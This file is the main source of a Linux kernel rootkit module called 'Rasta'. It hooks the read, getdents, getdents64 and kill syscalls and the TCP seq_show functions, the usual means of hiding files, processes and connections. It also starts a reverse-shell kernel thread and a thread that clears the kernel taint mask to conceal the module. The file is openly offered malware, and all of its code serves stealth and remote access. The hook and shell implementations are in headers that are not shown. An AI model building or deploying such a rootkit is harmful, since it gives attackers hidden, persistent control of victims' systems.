/*
 *    Rasta is a simple rootkit but keyword simple it gets so much better than this
 *
 * */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

// Our kernel header libraries
#include "include/headers.h"

// Ftrace library for syscall hooking
#include "ftrace/ftrace.h"

// Ftrace Hooks
#include "hooks/read.h"
#include "hooks/getdents.h"
#include "hooks/getdents64.h"
#include "hooks/kill.h"
#include "hooks/tcp.h"

// Kprobes
#include "kprobe/rev-shell.h"
#include "kprobe/taint_mask.h"

// Simple and Clean 
static struct ftrace_hook hooks[] = {
  HOOK("__x64_sys_read", hooked_read, &og_read),
  HOOK("__x64_sys_getdents", hooked_getdents, &og_getdents),
  HOOK("__x64_sys_getdents64", hooked_getdents64, &og_getdents64),
  HOOK("__x64_sys_kill", hooked_kill, &og_kill),
  HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &og_tcp4_seq_show),
  HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &og_tcp6_seq_show),
};

static int __init rasta_init(void) {
  int err;
  err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));

  mon_it = kthread_run(__shell, NULL, "rasta");

  if (err) {
    printk(KERN_ERR "ERROR\n");
    return err;
  }

  if (IS_ERR(mon_it)) {
    printk(KERN_ALERT "rasta : Failed so hard! just remove me.\n");
    return PTR_ERR(mon_it);
  }

  taint_mask_ptr = get_taint_mask_addr();
  if (!taint_mask_ptr) {
      printk(KERN_ERR "rasta : Could not get tainted_mask addr.\n");
      return -EFAULT;
  }

  clean_thread = kthread_run(my_thread, NULL, RESET_THREAD_NAME);
  if (IS_ERR(clean_thread)) {
    printk(KERN_ERR "rasta : Failed to start taint_mask clean_thread.\n");
    return PTR_ERR(clean_thread);
  }

  return 0;
}

static void __exit rasta_exit(void) {
  fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

  if (mon_it) {
    kthread_stop(mon_it);
  }

  if (clean_thread) {
    kthread_stop(clean_thread);
  }
}

MODULE_LICENSE("GPL");

module_init(rasta_init);
module_exit(rasta_exit);
